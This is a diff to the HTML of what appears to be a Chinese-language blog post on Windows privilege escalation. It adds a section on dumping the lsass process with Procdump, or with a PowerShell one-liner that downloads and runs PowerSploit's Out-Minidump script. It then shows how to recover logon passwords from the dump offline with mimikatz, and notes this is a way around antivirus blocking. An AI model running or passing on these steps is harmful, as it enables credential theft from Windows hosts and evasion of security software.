@@ -40,7 +40,6 @@
     <script src="/js/jquery.min.js"></script>
 
 </head>
-
 <body>
 
 
@@ -181,6 +180,35 @@
 <img src="/img/post/privilge_escalation_win_upload_getpass.png" alt="上传getpass" />
 <img src="/img/post/privilge_escalation_win_getpass1.png" alt="得到密码1" />
 <img src="/img/post/privilge_escalation_win_getpass2.png" alt="得到密码2" /></p></li>
+
+<li><p>导出hash本地得到密码<br />
+若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀</p>
+
+<ul>
+<li><p>导出文件dmp文件</p>
+
+<ul>
+<li>上传Procdump.exe导出</li>
+</ul>
+
+<blockquote>
+<pre><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+</blockquote>
+
+<ul>
+<li>或者执行PowerShell导出</li>
+</ul>
+
+<blockquote>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); &quot;Get-Process lsass | Out-Minidump&quot;
+</code></pre>
+</blockquote></li>
+
+<li><p>下载导出的dmp文件后用本地mimikatz解密<br />
+先输入：<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;</code><br />
+后输入：sekurlsa::logonpasswords</p></li>
+</ul></li>
 </ul>
 
 <h3 id="0x02-开启3389">0x02 开启3389</h3>
@@ -208,6 +236,12 @@ del 3389.bat
 
 <p><img src="/img/post/privilge_escalation_win_new_file_3389_bat.png" alt="新建开3389的注册表" /></p></li>
 </ul>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<p><img src="https://www.cnblogs.com/hiccup/p/4380298.html?_blank" alt="https://www.cnblogs.com/hiccup/p/4380298.html" /></p>
 
                 
                 <div style="padding:10px 1px;">
